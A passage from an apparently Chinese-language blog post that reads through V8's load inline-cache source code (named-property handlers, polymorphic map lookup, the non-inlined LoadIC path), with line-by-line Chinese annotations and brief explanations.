class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AccessorAssembler::HandleLoadICSmiHandlerLoadNamedCase</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> LazyLoadICParameters* p, TNode&lt;Object&gt; holder,</span></span></span><br><span class="line"><span class="params"><span class="function">    TNode&lt;IntPtrT&gt; handler_kind, TNode&lt;WordT&gt; handler_word, Label* rebox_double,</span></span></span><br><span class="line"><span class="params"><span class="function">    TVariable&lt;Float64T&gt;* var_double_value, TNode&lt;Object&gt; handler, Label* miss,</span></span></span><br><span class="line"><span class="params"><span class="function">    ExitPoint* exit_point, ICMode ic_mode, OnNonExistent on_nonexistent,</span></span></span><br><span class="line"><span class="params"><span class="function">    ElementSupport support_elements)</span> </span>&#123;</span><br><span class="line">  <span class="function">Label <span class="title">constant</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">field</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">normal</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span>,</span></span><br><span class="line"><span class="function">      <span class="title">slow</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span>, <span class="title">interceptor</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span>,</span></span><br><span class="line"><span class="function">      <span class="title">nonexistent</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">accessor</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span>,</span></span><br><span class="line"><span class="function">      <span class="title">global</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span>, <span class="title">module_export</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span>,</span></span><br><span class="line"><span class="function">      <span class="title">proxy</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span>,</span></span><br><span class="line"><span class="function">      <span class="title">native_data_property</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span>,</span></span><br><span class="line"><span class="function">      <span class="title">api_getter</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kField)), &amp;field);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">WordEqual</span>(handler_kind,</span><br><span class="line">                   <span class="built_in">IntPtrConstant</span>(LoadHandler::kConstantFromPrototype)),</span><br><span class="line">         &amp;constant);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kNonExistent)),</span><br><span class="line">         &amp;nonexistent);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kNormal)),</span><br><span class="line">         &amp;normal);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kAccessor)),</span><br><span class="line">         &amp;accessor);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(</span><br><span class="line">      <span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kNativeDataProperty)),</span><br><span class="line">      &amp;native_data_property);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kApiGetter)),</span><br><span class="line">         &amp;api_getter);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">WordEqual</span>(handler_kind,</span><br><span class="line">                   <span class="built_in">IntPtrConstant</span>(LoadHandler::kApiGetterHolderIsPrototype)),</span><br><span class="line">         &amp;api_getter);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kGlobal)),</span><br><span class="line">         &amp;global);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kSlow)), &amp;slow);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kProxy)), &amp;proxy);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">Branch</span>(<span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kModuleExport)),</span><br><span class="line">         &amp;module_export, &amp;interceptor);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;field);</span><br><span class="line">  <span class="built_in">HandleLoadField</span>(<span class="built_in">CAST</span>(holder), handler_word, var_double_value, rebox_double,</span><br><span class="line">                  miss, exit_point);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;nonexistent);</span><br><span class="line">  <span class="comment">// This is a handler for a load of a non-existent value.</span></span><br><span class="line">  <span class="keyword">if</span> (on_nonexistent == OnNonExistent::kThrowReferenceError) &#123;</span><br><span class="line">    exit_point-&gt;<span class="built_in">ReturnCallRuntime</span>(Runtime::kThrowReferenceError, p-&gt;<span class="built_in">context</span>(),</span><br><span class="line">                                  p-&gt;<span class="built_in">name</span>());</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">DCHECK_EQ</span>(OnNonExistent::kReturnUndefined, on_nonexistent);</span><br><span class="line">    exit_point-&gt;<span class="built_in">Return</span>(<span class="built_in">UndefinedConstant</span>());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;constant);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">Comment</span>(<span class="string">&quot;constant_load&quot;</span>);</span><br><span class="line">    exit_point-&gt;<span class="built_in">Return</span>(holder);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;normal);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">Comment</span>(<span class="string">&quot;load_normal&quot;</span>);</span><br><span class="line">    TNode&lt;NameDictionary&gt; properties = <span class="built_in">CAST</span>(<span class="built_in">LoadSlowProperties</span>(<span class="built_in">CAST</span>(holder)));</span><br><span class="line">    <span class="built_in">TVARIABLE</span>(IntPtrT, var_name_index);</span><br><span class="line">    <span class="function">Label <span class="title">found</span><span class="params">(<span class="keyword">this</span>, &amp;var_name_index)</span></span>;</span><br><span class="line">    <span class="built_in">NameDictionaryLookup</span>&lt;NameDictionary&gt;(properties, <span class="built_in">CAST</span>(p-&gt;<span class="built_in">name</span>()), &amp;found,</span><br><span class="line">                                         &amp;var_name_index, miss); <span class="comment">// 字典遍历</span></span><br><span class="line">    <span class="built_in">BIND</span>(&amp;found);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">TVARIABLE</span>(Uint32T, var_details);</span><br><span class="line">      <span class="built_in">TVARIABLE</span>(Object, var_value);</span><br><span class="line">      <span class="built_in">LoadPropertyFromNameDictionary</span>(properties, var_name_index.<span class="built_in">value</span>(),</span><br><span class="line">                                     &amp;var_details, &amp;var_value); <span class="comment">// 从字典中读取Property</span></span><br><span class="line">      TNode&lt;Object&gt; value = <span class="built_in">CallGetterIfAccessor</span>(</span><br><span class="line">          var_value.<span class="built_in">value</span>(), <span class="built_in">CAST</span>(holder), var_details.<span class="built_in">value</span>(), p-&gt;<span class="built_in">context</span>(),</span><br><span class="line">          p-&gt;<span class="built_in">receiver</span>(), miss); <span class="comment">// 使用Getter获取value</span></span><br><span class="line">      exit_point-&gt;<span class="built_in">Return</span>(value);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;accessor);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">Comment</span>(<span class="string">&quot;accessor_load&quot;</span>);</span><br><span class="line">    TNode&lt;IntPtrT&gt; descriptor =</span><br><span class="line">        <span class="built_in">Signed</span>(<span class="built_in">DecodeWord</span>&lt;LoadHandler::DescriptorBits&gt;(handler_word)); <span class="comment">// 解码得到descriptor</span></span><br><span class="line">    TNode&lt;AccessorPair&gt; accessor_pair =</span><br><span class="line">        <span class="built_in">CAST</span>(<span class="built_in">LoadDescriptorValue</span>(<span class="built_in">LoadMap</span>(<span class="built_in">CAST</span>(holder)), descriptor)); <span class="comment">// 获取accessor对</span></span><br><span class="line">    TNode&lt;Object&gt; getter =</span><br><span class="line">        <span class="built_in">LoadObjectField</span>(accessor_pair, AccessorPair::kGetterOffset); <span class="comment">// 获取getter</span></span><br><span class="line">    <span class="built_in">CSA_ASSERT</span>(<span class="keyword">this</span>, <span class="built_in">Word32BinaryNot</span>(<span class="built_in">IsTheHole</span>(getter)));</span><br><span class="line"></span><br><span class="line">    exit_point-&gt;<span class="built_in">Return</span>(<span class="built_in">Call</span>(p-&gt;<span class="built_in">context</span>(), getter, p-&gt;<span class="built_in">receiver</span>())); <span class="comment">// 通过getter获取内容</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;native_data_property);</span><br><span class="line">  <span class="built_in">HandleLoadCallbackProperty</span>(p, <span class="built_in">CAST</span>(holder), handler_word, exit_point);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;api_getter);</span><br><span class="line">  <span class="built_in">HandleLoadAccessor</span>(p, <span class="built_in">CAST</span>(holder), handler_word, <span class="built_in">CAST</span>(handler), handler_kind,</span><br><span class="line">                     exit_point);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;proxy);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// TODO(mythria): LoadGlobals don&#x27;t use this path. LoadGlobals need special</span></span><br><span class="line">    <span class="comment">// handling with proxies which is currently not supported by builtins. So</span></span><br><span class="line">    <span class="comment">// for such cases, we should install a slow path and never reach here. Fix</span></span><br><span class="line">    <span class="comment">// it to not generate this for LoadGlobals.</span></span><br><span class="line">    <span class="built_in">CSA_ASSERT</span>(<span class="keyword">this</span>,</span><br><span class="line">               <span class="built_in">WordNotEqual</span>(<span class="built_in">IntPtrConstant</span>(<span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(on_nonexistent)),</span><br><span class="line">                            <span class="built_in">IntPtrConstant</span>(<span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(</span><br><span class="line">                                OnNonExistent::kThrowReferenceError))));</span><br><span class="line">    <span class="built_in">TVARIABLE</span>(IntPtrT, var_index);</span><br><span class="line">    <span class="built_in">TVARIABLE</span>(Name, var_unique);</span><br><span class="line"></span><br><span class="line">    <span class="function">Label <span class="title">if_index</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">if_unique_name</span><span class="params">(<span class="keyword">this</span>)</span>,</span></span><br><span class="line"><span class="function">        <span class="title">to_name_failed</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (support_elements == kSupportElements) &#123;</span><br><span class="line">      <span class="built_in">DCHECK_NE</span>(on_nonexistent, OnNonExistent::kThrowReferenceError);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">TryToName</span>(p-&gt;<span class="built_in">name</span>(), &amp;if_index, &amp;var_index, &amp;if_unique_name, &amp;var_unique,</span><br><span class="line">                &amp;to_name_failed);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">BIND</span>(&amp;if_unique_name);</span><br><span class="line">      exit_point-&gt;<span class="built_in">ReturnCallStub</span>(</span><br><span class="line">          Builtins::<span class="built_in">CallableFor</span>(<span class="built_in">isolate</span>(), Builtins::kProxyGetProperty),</span><br><span class="line">          p-&gt;<span class="built_in">context</span>(), holder, var_unique.<span class="built_in">value</span>(), p-&gt;<span class="built_in">receiver</span>(),</span><br><span class="line">          <span class="built_in">SmiConstant</span>(on_nonexistent));</span><br><span class="line"></span><br><span class="line">      <span class="built_in">BIND</span>(&amp;if_index);</span><br><span class="line">      <span class="comment">// TODO(mslekova): introduce TryToName that doesn&#x27;t try to compute</span></span><br><span class="line">      <span class="comment">// the intptr index value</span></span><br><span class="line">      <span class="built_in">Goto</span>(&amp;to_name_failed);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">BIND</span>(&amp;to_name_failed);</span><br><span class="line">      <span class="comment">// TODO(duongn): use GetPropertyWithReceiver builtin once</span></span><br><span class="line">      <span class="comment">// |lookup_element_in_holder| supports elements.</span></span><br><span class="line">      exit_point-&gt;<span class="built_in">ReturnCallRuntime</span>(Runtime::kGetPropertyWithReceiver,</span><br><span class="line">                                    p-&gt;<span class="built_in">context</span>(), holder, p-&gt;<span class="built_in">name</span>(),</span><br><span class="line">                                    p-&gt;<span class="built_in">receiver</span>(), <span class="built_in">SmiConstant</span>(on_nonexistent));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      exit_point-&gt;<span class="built_in">ReturnCallStub</span>(</span><br><span class="line">          Builtins::<span class="built_in">CallableFor</span>(<span class="built_in">isolate</span>(), Builtins::kProxyGetProperty),</span><br><span class="line">          p-&gt;<span class="built_in">context</span>(), holder, p-&gt;<span class="built_in">name</span>(), p-&gt;<span class="built_in">receiver</span>(),</span><br><span class="line">          <span class="built_in">SmiConstant</span>(on_nonexistent));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;global);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">CSA_ASSERT</span>(<span class="keyword">this</span>, <span class="built_in">IsPropertyCell</span>(<span class="built_in">CAST</span>(holder)));</span><br><span class="line">    <span class="comment">// Ensure the property cell doesn&#x27;t contain the hole.</span></span><br><span class="line">    TNode&lt;Object&gt; value =</span><br><span class="line">        <span class="built_in">LoadObjectField</span>(<span class="built_in">CAST</span>(holder), PropertyCell::kValueOffset); <span class="comment">// 读取value</span></span><br><span class="line">    TNode&lt;Uint32T&gt; details = <span class="built_in">Unsigned</span>(<span class="built_in">LoadAndUntagToWord32ObjectField</span>(</span><br><span class="line">        <span class="built_in">CAST</span>(holder), PropertyCell::kPropertyDetailsRawOffset)); <span class="comment">// 读取details</span></span><br><span class="line">    <span class="built_in">GotoIf</span>(<span class="built_in">IsTheHole</span>(value), miss);</span><br><span class="line"></span><br><span class="line">    exit_point-&gt;<span class="built_in">Return</span>(<span class="built_in">CallGetterIfAccessor</span>(value, <span class="built_in">CAST</span>(holder), details,</span><br><span class="line">                                            p-&gt;<span class="built_in">context</span>(), p-&gt;<span class="built_in">receiver</span>(), miss));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;interceptor);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">Comment</span>(<span class="string">&quot;load_interceptor&quot;</span>);</span><br><span class="line">    exit_point-&gt;<span class="built_in">ReturnCallRuntime</span>(Runtime::kLoadPropertyWithInterceptor,</span><br><span class="line">                                  p-&gt;<span class="built_in">context</span>(), p-&gt;<span class="built_in">name</span>(), p-&gt;<span class="built_in">receiver</span>(),</span><br><span class="line">                                  holder, p-&gt;<span class="built_in">slot</span>(), p-&gt;<span class="built_in">vector</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">BIND</span>(&amp;slow);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">Comment</span>(<span class="string">&quot;load_slow&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (ic_mode == ICMode::kGlobalIC) &#123;</span><br><span class="line">      exit_point-&gt;<span class="built_in">ReturnCallRuntime</span>(Runtime::kLoadGlobalIC_Slow, p-&gt;<span class="built_in">context</span>(),</span><br><span class="line">                                    p-&gt;<span class="built_in">name</span>(), p-&gt;<span class="built_in">slot</span>(), p-&gt;<span class="built_in">vector</span>());</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      exit_point-&gt;<span class="built_in">ReturnCallRuntime</span>(Runtime::kGetProperty, p-&gt;<span class="built_in">context</span>(), holder,</span><br><span class="line">                                    p-&gt;<span class="built_in">name</span>(), p-&gt;<span class="built_in">receiver</span>());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;module_export);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">Comment</span>(<span class="string">&quot;module export&quot;</span>);</span><br><span class="line">    TNode&lt;UintPtrT&gt; index =</span><br><span class="line">        <span class="built_in">DecodeWord</span>&lt;LoadHandler::ExportsIndexBits&gt;(handler_word); <span class="comment">// 解码得到index</span></span><br><span class="line">    TNode&lt;Module&gt; <span class="keyword">module</span> = <span class="built_in">LoadObjectField</span>&lt;Module&gt;(</span><br><span class="line">        <span class="built_in">CAST</span>(p-&gt;<span class="built_in">receiver</span>()), JSModuleNamespace::kModuleOffset); <span class="comment">// 获取module</span></span><br><span class="line">    TNode&lt;ObjectHashTable&gt; exports =</span><br><span class="line">        <span class="built_in">LoadObjectField</span>&lt;ObjectHashTable&gt;(<span class="keyword">module</span>, Module::kExportsOffset); <span class="comment">// 获取export</span></span><br><span class="line">    TNode&lt;Cell&gt; cell = <span class="built_in">CAST</span>(<span class="built_in">LoadFixedArrayElement</span>(exports, index)); <span class="comment">// 从export得到index</span></span><br><span class="line">    <span class="comment">// The handler is only installed for exports that exist.</span></span><br><span class="line">    TNode&lt;Object&gt; value = <span class="built_in">LoadCellValue</span>(cell);</span><br><span class="line">    <span class="function">Label <span class="title">is_the_hole</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span></span>;</span><br><span class="line">    <span class="built_in">GotoIf</span>(<span class="built_in">IsTheHole</span>(value), &amp;is_the_hole);</span><br><span class="line">    exit_point-&gt;<span class="built_in">Return</span>(value);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">BIND</span>(&amp;is_the_hole);</span><br><span class="line">    &#123;</span><br><span class="line">      TNode&lt;Smi&gt; message = <span class="built_in">SmiConstant</span>(MessageTemplate::kNotDefined);</span><br><span class="line">      exit_point-&gt;<span class="built_in">ReturnCallRuntime</span>(Runtime::kThrowReferenceError, p-&gt;<span class="built_in">context</span>(),</span><br><span class="line">                                    message, p-&gt;<span class="built_in">name</span>());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(rebox_double);</span><br><span class="line">  exit_point-&gt;<span class="built_in">Return</span>(<span class="built_in">AllocateHeapNumberWithValue</span>(var_double_value-&gt;<span class="built_in">value</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第四部分</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">BIND</span>(&amp;try_polymorphic);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title class_">TNode</span>&lt;<span class="title class_">HeapObject</span>&gt; strong_feedback =</span><br><span class="line">        <span class="title class_">GetHeapObjectIfStrong</span>(feedback, &amp;miss); <span class="comment">// 判断feedback是否为强引用，不是的话则跳到miss</span></span><br><span class="line">    <span class="title class_">GotoIfNot</span>(<span class="title class_">IsWeakFixedArrayMap</span>(<span class="title class_">LoadMap</span>(strong_feedback)), &amp;stub_call); <span class="comment">// 判断feedback是否为WeakFixedArrayMap，不是的话则跳到stub_call</span></span><br><span class="line">    <span class="title class_">HandlePolymorphicCase</span>(lookup_start_object_map, <span class="title function_">CAST</span>(strong_feedback), <span class="comment">// feedback即是强引用又是WeakFixedArrayMap，则当前IC是Polymorphic状态</span></span><br><span class="line">                          &amp;if_handler, &amp;var_handler, &amp;miss);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>主要判断 <code>feedback</code> 是否为强引用，不是的话跳到 <code>miss</code> ；而后又判断是否为 <code>WeakFixedArrayMap</code>，不是的话则跳到 <code>stub_call</code> ，如果都满足则当前 <code>IC</code> 是 <code>Polymorphic</code> 状态</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AccessorAssembler::HandlePolymorphicCase</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    TNode&lt;Map&gt; lookup_start_object_map, TNode&lt;WeakFixedArray&gt; feedback,</span></span></span><br><span class="line"><span class="params"><span class="function">    Label* if_handler, TVariable&lt;MaybeObject&gt;* var_handler, Label* if_miss)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Comment</span>(<span class="string">&quot;HandlePolymorphicCase&quot;</span>);</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(MachineRepresentation::kTagged, var_handler-&gt;<span class="built_in">rep</span>());</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Iterate &#123;feedback&#125; array.</span></span><br><span class="line">  <span class="type">const</span> <span class="type">int</span> kEntrySize = <span class="number">2</span>; <span class="comment">// feedback数组的每一个项所占的空间，有Map和handle，所以是2</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Load the &#123;feedback&#125; array length.</span></span><br><span class="line">  TNode&lt;IntPtrT&gt; length = <span class="built_in">LoadAndUntagWeakFixedArrayLength</span>(feedback); <span class="comment">// 得到feedback的数组长度</span></span><br><span class="line">  <span class="built_in">CSA_ASSERT</span>(<span class="keyword">this</span>, <span class="built_in">IntPtrLessThanOrEqual</span>(<span class="built_in">IntPtrConstant</span>(kEntrySize), length));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// This is a hand-crafted loop that iterates backwards and only compares</span></span><br><span class="line">  <span class="comment">// against zero at the end, since we already know that we will have at least a</span></span><br><span class="line">  <span class="comment">// single entry in the &#123;feedback&#125; array anyways.</span></span><br><span class="line">  <span class="built_in">TVARIABLE</span>(IntPtrT, var_index, <span class="built_in">IntPtrSub</span>(length, <span class="built_in">IntPtrConstant</span>(kEntrySize)));</span><br><span class="line">  <span class="function">Label <span class="title">loop</span><span class="params">(<span class="keyword">this</span>, &amp;var_index)</span>, <span class="title">loop_next</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">  <span class="built_in">Goto</span>(&amp;loop);</span><br><span class="line">  <span class="built_in">BIND</span>(&amp;loop);</span><br><span class="line">  &#123;</span><br><span class="line">    TNode&lt;MaybeObject&gt; maybe_cached_map =</span><br><span class="line">        <span class="built_in">LoadWeakFixedArrayElement</span>(feedback, var_index.<span class="built_in">value</span>()); <span class="comment">// 获取缓存的map</span></span><br><span class="line">    <span class="built_in">CSA_ASSERT</span>(<span class="keyword">this</span>, <span class="built_in">IsWeakOrCleared</span>(maybe_cached_map));</span><br><span class="line">    <span class="built_in">GotoIfNot</span>(<span class="built_in">IsWeakReferenceTo</span>(maybe_cached_map, lookup_start_object_map), <span class="comment">// 检查map是否相同</span></span><br><span class="line">              &amp;loop_next);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Found, now call handler.</span></span><br><span class="line">    TNode&lt;MaybeObject&gt; handler =</span><br><span class="line">        <span class="built_in">LoadWeakFixedArrayElement</span>(feedback, var_index.<span class="built_in">value</span>(), kTaggedSize); <span class="comment">//  找到了handler</span></span><br><span class="line">    *var_handler = handler;</span><br><span class="line">    <span class="built_in">Goto</span>(if_handler); <span class="comment">// 跳到if_handler</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">BIND</span>(&amp;loop_next);</span><br><span class="line">    var_index =</span><br><span class="line">        <span class="built_in">Signed</span>(<span class="built_in">IntPtrSub</span>(var_index.<span class="built_in">value</span>(), <span class="built_in">IntPtrConstant</span>(kEntrySize))); <span class="comment">// 下一个entry</span></span><br><span class="line">    <span class="built_in">Branch</span>(<span class="built_in">IntPtrGreaterThanOrEqual</span>(var_index.<span class="built_in">value</span>(), <span class="built_in">IntPtrConstant</span>(<span class="number">0</span>)),</span><br><span class="line">           &amp;loop, if_miss); <span class="comment">// 没有找到，则跳到miss</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一部分主要是寻找是否有匹配的 <code>map</code> ，如果是则使用对应的 <code>handler</code> ，否则跳到 <code>miss</code></p>
<p>第五部分</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">BIND</span>(&amp;stub_call);</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="built_in">Comment</span>(<span class="string">&quot;LoadIC_BytecodeHandler_noninlined&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Call into the stub that implements the non-inlined parts of LoadIC.</span></span><br><span class="line">   <span class="comment">// 本次调用没有IC，调用Builtin kLoadIC_Noninlined</span></span><br><span class="line">   Callable ic =</span><br><span class="line">       Builtins::<span class="built_in">CallableFor</span>(<span class="built_in">isolate</span>(), Builtins::kLoadIC_Noninlined);</span><br><span class="line">   TNode&lt;Code&gt; code_target = <span class="built_in">HeapConstant</span>(ic.<span class="built_in">code</span>());</span><br><span class="line">   exit_point-&gt;<span class="built_in">ReturnCallStub</span>(ic.<span class="built_in">descriptor</span>(), code_target, p-&gt;<span class="built_in">context</span>(),</span><br><span class="line">                              p-&gt;<span class="built_in">receiver_and_lookup_start_object</span>(), p-&gt;<span class="built_in">name</span>(),</span><br><span class="line">                              p-&gt;<span class="built_in">slot</span>(), p-&gt;<span class="built_in">vector</span>());</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>跳到 <code>stub_call</code> 则表示此次调用没有 <code>IC</code> ，会调用 <code>Builtin kLoadIC_Noninlined</code> 也就是 <code>AccessorAssembler::LoadIC_Noninlined</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AccessorAssembler::LoadIC_Noninlined</span><span class="params">(<span class="type">const</span> LoadICParameters* p,</span></span></span><br><span class="line"><span class="params"><span class="function">                                          TNode&lt;Map&gt; lookup_start_object_map,</span></span></span><br><span class="line"><span class="params"><span class="function">                                          TNode&lt;HeapObject&gt; feedback,</span></span></span><br><span class="line"><span class="params"><span class="function">                                          TVariable&lt;MaybeObject&gt;* var_handler,</span></span></span><br><span class="line"><span class="params"><span class="function">                                          Label* if_handler, Label* miss,</span></span></span><br><span class="line"><span class="params"><span class="function">                                          ExitPoint* exit_point)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Neither deprecated map nor monomorphic. These cases are handled in the</span></span><br><span class="line">  <span class="comment">// bytecode handler.</span></span><br><span class="line">  <span class="built_in">CSA_ASSERT</span>(<span class="keyword">this</span>, <span class="built_in">Word32BinaryNot</span>(<span class="built_in">IsDeprecatedMap</span>(lookup_start_object_map)));</span><br><span class="line">  <span class="built_in">CSA_ASSERT</span>(<span class="keyword">this</span>, <span class="built_in">TaggedNotEqual</span>(lookup_start_object_map, feedback));</span><br><span class="line">  <span class="built_in">CSA_ASSERT</span>(<span class="keyword">this</span>, <span class="built_in">Word32BinaryNot</span>(<span class="built_in">IsWeakFixedArrayMap</span>(<span class="built_in">LoadMap</span>(feedback))));</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(MachineRepresentation::kTagged, var_handler-&gt;<span class="built_in">rep</span>());</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// Check megamorphic case.</span></span><br><span class="line">    